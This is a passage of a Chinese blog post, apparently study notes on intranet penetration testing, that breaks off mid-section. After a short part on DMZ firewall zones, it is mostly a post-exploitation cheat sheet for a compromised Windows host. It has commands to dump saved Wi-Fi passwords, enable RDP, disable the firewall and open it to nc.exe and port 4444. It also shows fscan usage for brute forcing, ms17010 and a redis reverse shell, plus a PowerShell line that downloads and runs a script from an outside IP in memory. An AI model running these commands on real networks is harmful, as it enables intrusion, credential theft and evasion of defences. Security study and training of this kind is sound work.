地址访问此域、允许此域访问哪些 IP 地址和网段进行设置。这些 措施，将使得网络风险最小化，当攻击发生时，可以尽可能地将威胁隔离，从而降低对域内计算机的影响。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203152306469.png\" alt=\"image-20221203152306469\"></p>\n<p>在一个用路由器连接的内网中，可以将网络划分为三个区域:</p>\n<p>安全级别最高的内网；</p>\n<p>安全级别中等的 DMZ;</p>\n<p>安全级别最低的外网</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内网可以访问外网:内网用户需要自由地访问外网。在这一策略中,防火墙需要执行NAT。</span><br><span class=\"line\">内网可以访问DMZ:此策略使内网用户可以使用或者管理DMZ中的服务器</span><br><span class=\"line\">外网不能访问内网:这是防火墙的基本策略。内网中存储的是公司内部数据,显然,这些数据一般是不允许外网用户访问的(如果要访问,就要通过VPN的方式来进行)</span><br><span class=\"line\">外网可以访问DMZ:因为DMZ中的服务器需要为外界提供服务,所以外网必须可以访问DMZ。同时,需要由防火墙来完成从对外地址到服务器实际地址的转换。</span><br><span class=\"line\">DMZ不能访问内网:如果不执行此策略,当攻击者攻陷DMZ时,内网将无法受到保护</span><br><span class=\"line\">DMZ不能访问外网:此策略也有例外。例如,在DMZ中放置了邮件服务器,就要允许访问外网,否则邮件服务器无法正常工作。</span><br></pre></td></tr></table></figure>\n<h2 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<p>攻击流程详解</p>\n<p>信息收集 - 漏洞利用 - 权限提升 - 权限维持 - 隧道技术 - 内网渗透</p>\n<p>下面建立在你有 shell，你把人家上了的情况</p>\n<h3 id=\"收集本机信息\"><a class=\"markdownIt-Anchor\" href=\"#收集本机信息\">#</a> 收集本机信息</h3>\n<h4 id=\"查看基本信息\"><a class=\"markdownIt-Anchor\" href=\"#查看基本信息\">#</a> 查看基本信息</h4>\n<p>1. 收集网络信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell ipconfig</span><br></pre></td></tr></table></figure>\n<p>2. 收集操作系统和软件信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>\n<p>3. 查看系统体系结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>\n<p>4. 查看安装软件及版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell wmic product get name,version</span><br><span class=\"line\">shell powershell &quot;Get‐WmiObject ‐class win32_product | Select‐Object ‐Property name,version&quot;</span><br></pre></td></tr></table></figure>\n<p>5. 查看本机服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic service list brief</span><br></pre></td></tr></table></figure>\n<p>6. 查看进程信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist</span><br><span class=\"line\">wmic process list brief</span><br></pre></td></tr></table></figure>\n<p>7. 开机自启程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic startup get command,caption</span><br></pre></td></tr></table></figure>\n<p>8. 查看计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chcp 437</span><br><span class=\"line\">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>\n<p>9. 查看开机时间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net statistics workstation</span><br></pre></td></tr></table></figure>\n<p>10. 查看用户列表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net user</span><br><span class=\"line\">wmic useraccount get name ,SID</span><br></pre></td></tr></table></figure>\n<p>11. 列出会话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net session </span><br></pre></td></tr></table></figure>\n<p>12. 列出连接信息，端口信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -ano</span><br></pre></td></tr></table></figure>\n<p>13. 查看补丁信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo</span><br><span class=\"line\">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>\n<p>14. 查看共享</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net share</span><br><span class=\"line\">wmic share get name,path,status</span><br></pre></td></tr></table></figure>\n<p>15. 查路由</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">route print</span><br></pre></td></tr></table></figure>\n<p>16. 查 ARP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a</span><br></pre></td></tr></table></figure>\n<p>17. 开启远程服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic path win32_terminalservicesetting where (_CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class=\"line\"></span><br><span class=\"line\">//2003之后</span><br><span class=\"line\">#开启</span><br><span class=\"line\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t</span><br><span class=\"line\">REG_DWORD /d 00000000 /f </span><br><span class=\"line\">#关闭</span><br><span class=\"line\">REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t</span><br><span class=\"line\">REG_DWORD /d 11111111 /f </span><br></pre></td></tr></table></figure>\n<p>18 收集 wifi 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr ‐i ‐v echo | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>\n<p>19. 修改 RDP 端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP‐Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure>\n<p>20. 查看代理信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;</span><br></pre></td></tr></table></figure>\n<p>21. 查看登录凭证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmdkey /l</span><br></pre></td></tr></table></figure>\n<p>22. 查询用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup</span><br></pre></td></tr></table></figure>\n<p>23. 查询管理员组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup administrators</span><br><span class=\"line\"></span><br><span class=\"line\">如果电脑加入域后，与中domain admins 是默认管理员</span><br></pre></td></tr></table></figure>\n<p>24. 查看最近打开文档</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir %APPDATA%\\Microsoft\\Windows\\Recent</span><br></pre></td></tr></table></figure>\n<p>25. 杀软查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic /node:localhost /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname /format:list</span><br></pre></td></tr></table></figure>\n<h4 id=\"防火墙操作\"><a class=\"markdownIt-Anchor\" href=\"#防火墙操作\">#</a> 防火墙操作</h4>\n<p>1. 查看防火墙状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall show state</span><br></pre></td></tr></table></figure>\n<p>2. 关闭防火墙</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall set opmode disable  //2003之前</span><br><span class=\"line\">netsh advfirewall set allprofiles state off   //优先使用</span><br></pre></td></tr></table></figure>\n<p>3. 查看防火墙配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall show config</span><br></pre></td></tr></table></figure>\n<p>4. 修改防火墙配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//允许指定的程序进行全部的连接</span><br><span class=\"line\">netsh firewall add allowedprogram c:\\nc.exe &quot;allownc&quot; enable   //2003之前</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot;    //2003之后</span><br><span class=\"line\"></span><br><span class=\"line\">//允许相应端口</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;RemoteDesktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class=\"line\"></span><br><span class=\"line\">//允许4444端口进站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=in action=allow protocol=tcp localport=4444</span><br><span class=\"line\"></span><br><span class=\"line\">//允许a.exe进站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=in action=allow program=c:\\a.exe </span><br><span class=\"line\"></span><br><span class=\"line\">//允许4444端口出站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=out action=allow protocol=tcp localport=444</span><br><span class=\"line\"></span><br><span class=\"line\">//允许a.exe出站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=out action=allow program=c:\\a.exe</span><br><span class=\"line\"></span><br><span class=\"line\">//允许指定 程序退出</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;Allownc&quot; dir=out action=allow program=&quot;C: \\nc.exe&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"自动化收集信息\"><a class=\"markdownIt-Anchor\" href=\"#自动化收集信息\">#</a> 自动化收集信息</h3>\n<p>bat 语法：</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.终端输出</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"number\">2</span>.暂停,等待按键继续</span><br><span class=\"line\"><span class=\"built_in\">pause</span></span><br><span class=\"line\"><span class=\"number\">3</span>.不显示后续命令行及当前命令行</span><br><span class=\"line\"><span class=\"built_in\">echo</span> off</span><br><span class=\"line\">whoami</span><br><span class=\"line\"><span class=\"number\">4</span>.显示命令，分多个提示符显示</span><br><span class=\"line\"><span class=\"built_in\">echo</span> on</span><br><span class=\"line\">whoami</span><br><span class=\"line\"><span class=\"number\">5</span>.只显示结果,在每个命令行的最前面，表示运行时不显示这一行的命令行</span><br><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\"><span class=\"number\">6</span>.调用另一个bat</span><br><span class=\"line\"><span class=\"keyword\">call</span> c:\\<span class=\"number\">2</span>.bat</span><br><span class=\"line\"><span class=\"number\">7</span>.注释</span><br><span class=\"line\"><span class=\"comment\">rem</span></span><br><span class=\"line\"><span class=\"number\">8</span>.输出到文件</span><br><span class=\"line\">whoami &gt; <span class=\"number\">1</span>.txt</span><br><span class=\"line\"><span class=\"number\">9</span>.追加</span><br><span class=\"line\"><span class=\"built_in\">ipconfig</span> &gt;&gt; <span class=\"number\">2</span>.txt</span><br></pre></td></tr></table></figure>\n<p>一个简单的脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@echo off</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">ipconfig &gt;&gt;1.txt</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; &gt;&gt;1.txt</span><br><span class=\"line\">systeminfo| findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; &gt;&gt;1.txt</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">echo %PROCESSOR_ARCHITECTURE% &gt;&gt;1.txt</span><br></pre></td></tr></table></figure>\n<p>擦，大哥写的脚本</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> /f &quot;delims=&quot; <span class=\"variable\">%%A</span> <span class=\"keyword\">in</span> (&#x27;<span class=\"built_in\">dir</span> /s /b <span class=\"variable\">%WINDIR%</span>\\system32\\*htable.xsl&#x27;) <span class=\"keyword\">do</span> <span class=\"built_in\">set</span> &quot;var=<span class=\"variable\">%%A</span>&quot;</span><br><span class=\"line\">wmic process get CSName,Description,ExecutablePath,ProcessId /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic USERACCOUNT list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic group list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic volume get <span class=\"built_in\">Label</span>,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic netuse list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic qfe get Caption,Description,HotFixID,InstalledOn /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic startup get Caption,Command,Location,User /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic Timezone get DaylightName,Description,StandardName /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure>\n<h3 id=\"内网ip扫描\"><a class=\"markdownIt-Anchor\" href=\"#内网ip扫描\">#</a> 内网 IP 扫描</h3>\n<p>1.netbios</p>\n<p>这是一款用于扫描 Windows 网络上 NetBIOS 名字信息的程序。该程序对给出范围内的每一个地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan 列出它的 IP 地址、NetBIOS 计算机名、登录用户名和 MAC 地址。但只能用于局域网，NBTSCAN 可以取到 PC 的真实 IP 地址和 MAC 地址，如果有”ARP 攻击” 在做怪，可以找到装有 ARP 攻击的 PC 的 IP / 和 MAC 地址。但只能用于局域网</p>\n<blockquote>\n<p>nbtscan.exe + IP</p>\n</blockquote>\n<p>2.ICMP</p>\n<p>还可以利用 ICMP 协议探测内网。依次对内网中的每个 IP 地址执行 ping 命令，可以快速找出内网中所有存活酌主机。在渗透测试中中，可以使用如下命令循环探测整个 C 段</p>\n<blockquote>\n<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL=”</p>\n</blockquote>\n<p>3.arp</p>\n<blockquote>\n<p>apr -t IP</p>\n</blockquote>\n<p>4.Kscan</p>\n<p>kscan 是一款资产测绘工具，可针对指定资产进行端口扫描以及 TCP 指纹识别和 Banner 抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴力破解，且是 go 平台首款开源的 RDP 暴力破解工具</p>\n<blockquote>\n<p>kscan.exe -t 192.168.13.0/24 --encoding  utf-8</p>\n</blockquote>\n<p>其他用法: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xjdnZ2di9rc2Nhbg==\">https://github.com/lcvvvv/kscan</span></p>\n<blockquote>\n<p>-t , --target 指定探测对象：</p>\n<p>IP 地址：114.114.114.114</p>\n<p>IP 地址段：114.114.114.114/24, 不建议子网掩码小于 12</p>\n<p>IP 地址段：114.114.114.114-115.115.115.115</p>\n<p>URL 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUuY29t\">https://www.baidu.com</span></p>\n<p>文件地址：file:/tmp/target.txt</p>\n<p>–spy 网段探测模式，此模式下将自动探测主机可达的内网网段可接收参数为：</p>\n<p>(空)、192、10、172、all、指定 IP 地址 (将探测该 IP 地址 B 段存活网关)</p>\n</blockquote>\n<p>5.fscan</p>\n<p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis 批量写公钥、计划任务反弹 shell、读取 win 网卡信息、web 指纹识别、web 漏洞扫描、netbios 探测、域控识别等功能。</p>\n<blockquote>\n<p>fscan.exe -h 192.168.13.0/24</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class=\"line\">fscan.exe -hf ip.txt (以文件导入)</span><br><span class=\"line\">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br></pre></td></tr></table></figure>\n<p>6.ladon</p>\n<p>Ladon 一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键 GetShell，支持批量 A 段 / B 段 / C 段以及跨网段扫描，支持 URL、主机、域名列表扫描。7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">### 003 网段扫描/批量扫描</span><br><span class=\"line\">CIDR格式：不只是/24/16/8(所有)</span><br><span class=\"line\">Ladon 192.168.1.8/24 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/16 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/8 扫描模块</span><br><span class=\"line\">字母格式：仅C段B段A段 顺序排序</span><br><span class=\"line\">Ladon 192.168.1.8/c 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/b 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/a 扫描模块</span><br><span class=\"line\">TXT格式</span><br><span class=\"line\">##### 004 ICMP批量扫描C段列表存活主机</span><br><span class=\"line\">Ladon ip24.txt ICMP</span><br><span class=\"line\">##### 005 ICMP批量扫描B段列表存活主机</span><br><span class=\"line\">Ladon ip16.txt ICMP</span><br><span class=\"line\">##### 006 ICMP批量扫描cidr列表(如某国IP段)</span><br><span class=\"line\">Ladon cidr.txt ICMP</span><br><span class=\"line\">##### 007 ICMP批量扫描域名是否存活</span><br><span class=\"line\">Ladon domain.txt ICMP</span><br><span class=\"line\">##### 008 ICMP批量扫描机器是否存活</span><br><span class=\"line\">Ladon host.txt ICMP</span><br></pre></td></tr></table></figure>\n<p>还有好多自己找吧</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>1.scanline</p>\n<p>ScanLine 是一款 windows 下的端口扫描的命令行程序。它可以完成 PING 扫描、TCP 端口扫描、UDP 端口扫描等功能。运行速度很快，不需要 winPcap 库支持，应用场合受限较少。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scanline.exe ‐bhpt 21‐23,25,80,110,135‐139,143,443,445,1433,1521,3306,3389,5556,5631,5900,8080 100.100.0.39</span><br><span class=\"line\">scanline.exe ‐bhpt 80,443 100.100.0.1‐254(IP)</span><br><span class=\"line\">scanline.exe ‐bhpt 139,445 IP</span><br></pre></td></tr></table></figure>\n<p>2.telnet</p>\n<p>Telnet 协议是 TCP/IP 协议族的一员，是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用 Telnet 协议，可以与目标服务器建立连接。如果只是想快速探测某台主机的某个常规高危端口是否开放，使用 telnet 命令是最方便的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet 192.168.13.100 3389</span><br></pre></td></tr></table></figure>\n<p>3.readteam tool</p>\n<p>RedTeamTool 中有一个本地端口扫面的工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">portscanx64 0 10000</span><br></pre></td></tr></table></figure>\n<p>4.powerspioit</p>\n<p>PowerSploit 是一款基于 PowerShell 的后渗透框架软件，包含了很多 PowerShell 的攻击脚本，它们主要用于渗透中的信息侦测，权限提升、权限维持等</p>\n<p>本地执行：需要将程序放到目标机上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell ‐exec bypass Import‐Module .\\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts 192.168.41.0/24 ‐T 4 ‐ports &#x27;445,8080,3389,80&#x27; ‐oA c:\\1.txt</span><br></pre></td></tr></table></figure>\n<p>远程执行：文件不落地执行</p>\n<p>先去指定的地址下载，在执行，只存在于内存中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell ‐exec bypass ‐c IEX (New‐Object System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:8080/Invoke‐Portscan.ps1&#x27;);import‐module .\\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts 192.168.41.0/24 ‐T 4 ‐ports &#x27;445,8080,3389,80&#x27; ‐oA c:\\1.txt</span><br></pre></td></tr></table></figure>\n<p>5.nishang</p>\n<p>Nishang 